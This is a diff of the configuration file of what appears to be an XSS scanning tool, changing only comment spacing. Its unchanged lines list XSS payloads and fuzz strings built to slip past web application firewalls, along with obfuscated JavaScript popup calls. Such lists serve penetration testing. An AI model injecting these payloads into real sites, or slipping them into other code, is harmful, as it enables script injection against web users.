@@ -1,10 +1,10 @@
 changes = '''bug fixes;detection of up to 66 WAFs'''
 
 defaultEditor = 'nano'
-blindPayload = '' # your blind XSS payload
-xsschecker = 'v3dm0s' # A non malicious string to check for reflections and stuff
+blindPayload = '' #  your blind XSS payload
+xsschecker = 'v3dm0s' #  A non malicious string to check for reflections and stuff
 
-# More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies
+#  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies
 proxies = {'http' : 'http://0.0.0.0:8080', 'https' : 'http://0.0.0.0:8080'}
 
 minEfficiency = 90
@@ -17,25 +17,25 @@ specialAttributes = ['srcdoc', 'src']
 
 badTags = ('iframe', 'title', 'textarea', 'noembed', 'style', 'template', 'noscript')
 
-tags = ('html', 'd3v', 'a', 'details') # HTML Tags
+tags = ('html', 'd3v', 'a', 'details') #  HTML Tags
 
 jFillings = ('-', '*', ';', '/')
 lFillings = ('', ' x')
-eFillings = ('%09', '%0a', '%0d',  '+') # "Things" to use between event handler and = or between function and =
-fillings = ('%09', '%0a', '%0d', '/+/') # "Things" to use instead of space
+eFillings = ('%09', '%0a', '%0d',  '+') #  "Things" to use between event handler and = or between function and =
+fillings = ('%09', '%0a', '%0d', '/+/') #  "Things" to use instead of space
 
-eventHandlers = { # Event handlers and the tags compatible with them
+eventHandlers = { #  Event handlers and the tags compatible with them
 'ontoggle': ['details'],
 'onpointerenter': ['d3v', 'details', 'html', 'a'],
 'onmouseover': ['a', 'html', 'd3v']
 }
 
-functions = ( # JavaScript functions to get a popup
+functions = ( #  JavaScript functions to get a popup
 '[8].find(confirm)', 'confirm()',
 '(confirm)()', 'co\u006efir\u006d()',
 '(prompt)``', 'a=prompt,a()')
 
-payloads = ( # Payloads for filter & WAF evasion
+payloads = ( #  Payloads for filter & WAF evasion
 '\'"</Script><Html Onmouseover=(confirm)()//'
 '<imG/sRc=l oNerrOr=(prompt)() x>',
 '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
@@ -57,7 +57,7 @@ payloads = ( # Payloads for filter & WAF evasion
 '<img src=x onerror=confir\u006d`1`>',
 '<svg/onload=co\u006efir\u006d`1`>')
 
-fuzzes = ( # Fuzz strings to test WAFs
+fuzzes = ( #  Fuzz strings to test WAFs
 '<test', '<test//', '<test>', '<test x>', '<test x=y', '<test x=y//',
 '<test/oNxX=yYy//', '<test oNxX=yYy>', '<test onload=x', '<test/o%00nload=x',
 '<test sRc=xxx', '<test data=asa', '<test data=javascript:asa', '<svg x=y>',
